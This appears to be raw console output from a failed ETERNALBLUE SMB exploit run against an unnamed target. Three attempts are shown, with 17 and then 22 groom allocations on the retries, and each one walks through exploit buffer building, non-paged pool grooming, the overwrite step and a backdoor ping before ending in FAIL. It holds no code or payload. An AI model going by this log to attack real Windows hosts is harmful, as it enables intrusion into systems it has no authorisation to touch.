[*] Connecting to target for exploitation.
    [+] Connection established for exploitation.
[*] Pinging backdoor...
    [+] Backdoor not installed, game on.
[*] Building exploit buffer
[*] Sending all but last fragment of exploit packet
    ................DONE.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Starting non-paged pool grooming
    [+] Sending SMBv2 buffers
        .............DONE.
    [+] Sending large SMBv1 buffer..DONE.
    [+] Sending final SMBv2 buffers......DONE.
    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Sending last fragment of exploit packet!
    DONE.
[*] Receiving response from exploit packet
    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending egg to corrupted connection.
[*] Triggering free of corrupted buffer.
[*] Pinging backdoor...
    [+] Backdoor NOT installed
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Trying again with 17 Groom Allocations
[*] Connecting to target for exploitation.
    [+] Connection established for exploitation.
[*] Pinging backdoor...
    [+] Backdoor not installed, game on.
[*] Building exploit buffer
[*] Sending all but last fragment of exploit packet
    ................DONE.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Starting non-paged pool grooming
    [+] Sending SMBv2 buffers
        ..................DONE.
    [+] Sending large SMBv1 buffer..DONE.
    [+] Sending final SMBv2 buffers......DONE.
    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Sending last fragment of exploit packet!
    DONE.
[*] Receiving response from exploit packet
    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending egg to corrupted connection.
[*] Triggering free of corrupted buffer.
[*] Pinging backdoor...
    [+] Backdoor NOT installed
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Trying again with 22 Groom Allocations
[*] Connecting to target for exploitation.
    [+] Connection established for exploitation.
[*] Pinging backdoor...
    [+] Backdoor not installed, game on.
[*] Building exploit buffer
[*] Sending all but last fragment of exploit packet
    ................DONE.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Starting non-paged pool grooming
    [+] Sending SMBv2 buffers
        .......................DONE.
    [+] Sending large SMBv1 buffer..DONE.
    [+] Sending final SMBv2 buffers......DONE.
    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Sending last fragment of exploit packet!
    DONE.
[*] Receiving response from exploit packet
    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending egg to corrupted connection.
[*] Triggering free of corrupted buffer.
[*] Pinging backdoor...
    [+] Backdoor NOT installed
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] CORE terminated with status code 0xdf5d0037
[-] Error getting output back from Core; aborting...
[*] Core thread exit code: 0x00000000
[*] Proxy thread exit code:   0x00000000
